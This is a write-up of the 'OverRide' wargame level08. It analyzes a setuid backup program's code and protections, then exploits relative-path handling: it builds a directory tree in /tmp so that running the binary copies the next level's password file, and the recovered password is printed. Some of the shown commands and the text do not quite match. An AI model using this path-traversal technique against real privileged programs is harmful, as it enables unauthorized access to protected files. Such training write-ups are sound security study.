# level08

### First analysis

As always, the securities then the code:

```sh
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08
```

For the first time we have a Full RELRO, which means this time .got, .got.plt and .fini_array are now in readonly which means GOT overwrite are completely impossible now. We also have a stack Canary that we know a little more about now. No NX and no PIE so Ret2LibC and shellcode in env variable should be possible depending on the code part that we are gonna check right now:

```c
void    log_wrapper(FILE *fs, char *msg, char *filename) {
    char            buffer[264];
    unsigned int    stack_canary;

    strcpy(buffer, msg);
    snprintf(&buffer[strlen(buffer)], 254 - strlen(buffer), filename);
    buffer[strcspn(buffer, "\n")] = 0;
    fprintf(fs, "LOG: %s\n", buffer);

    return;
}

int main(int ac, char **av) {
    char    *log_filename = "./backups/.log";
    FILE    *log_file;
    FILE    *backup_file;
    char    buffer[104];
    int     backup_fd;
    char    current_char;

    if (ac != 2) {
        printf("Usage: %s filename\n", av[0]);
    }

    log_file = fopen(log_filename, "w");
    if (!log_file) {
        printf("ERROR: Failed to open %s\n", log_filename);
        exit(1);
    }

    log_wrapper(log_file, "Starting backup: ", av[1]);

    backup_file = fopen(av[1], "r");
    if (!backup_file) {
        printf("ERROR: Failed to open %s\n", av[1]);
        exit(1);
    }

    strcpy(buffer, "./backups/");
    strncat(buffer, av[1], 99 - strlen(buffer) - 1);

    backup_fd = open(buffer, O_WRONLY | O_CREAT | O_TRUNC, 0640);
    if (backup_fd < 0) {
        printf("ERROR: Failed to open %s\n", buffer);
        exit(1);
    }

    while (1) {
        current_char = fgetc(backup_file);
        if (current_char == EOF) {
            break;
        }
        write(backup_fd, &current_char, 1);
    }
    log_wrapper(log_file, "Finished back up ", av[1]);

    fclose(backup_file);
    close(backup_fd);

    return 0;
}
```

Again a pretty long code that does a few thing. First we have to give it a filename in av[1], then it will open ./backups/.log to log everything that happen in the code using log_wrapper function. After that av[1] will be open in readonly, and open a second time with ./backups before av[1] in write mode this time. It will then read what's on av[1] and write it in ./backups/av[1].

That's a very weird way to do things but what we can notice as potential vulnerability is the presence of buffers with fixed size that we can interact with through av[1], the usage of strcpy instead of strncpy, the usage of exit instead of return, and also, something we haven't exploited yet, the usage of relative paths.

### Solution

Since a stack canary is present, making overflows harder, and that Full RELRO is activated, so GOT overwrite is compromised, we started with the relative path option at first to see if something could be done with that or not.

So as we noticed one file is open using av[1] only, which means is we try to open .log  with av[1] = ".log" for example, it will be open in the current folder, and a second file opened using ./backups/av[1] so with ".log" it would open ./backups/.log.

Second important thing to notice, if we type av[1] = "/.log" then the first file opened will open an absolute path at the root of the machine "/.log" whereas with the same input for av[1] the second file opened would be ./backups//.log, a "//" is interpreted the same as "/" so the locations of the files can now be very far from each other.

A first try we did was to open /home/users/level09/.pass, so we tried av[1] with this value, hoping it would create a file in ./backups containing the password read in level09's .pass file.

```sh
level08@OverRide:~$ ./level08 "/home/users/level08/.pass"
ERROR: Failed to open ./backups//home/users/level08/.pass
```

With this log we know that level09's .pass file has been opened successfully or the error message wouldn't be the same, however there are no folders ./backups/home/users/level09 and we can't create folders inside, we don't have the authorizations.

Then we realized that "./backups" would search for a relative path of backups depending on where the user executing is and not where the executed file is. With that we had all the elements, we could execute level08 being in /tmp where we have a right to write then manage to access to level09's .pass file and write it somewhere, to do that we simply used the ".." option:

```sh
level08@OverRide:/tmp$ mkdir backups
level08@OverRide:/tmp$ mkdir home
level08@OverRide:/tmp/home$ mkdir users
level08@OverRide:/tmp/home/users$ mkdir level09

level08@OverRide:/tmp$ /home/users/level08/level08 "../home/users/level09/.pass"

level08@OverRide:/tmp$ cat /tmp/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

## Important doc
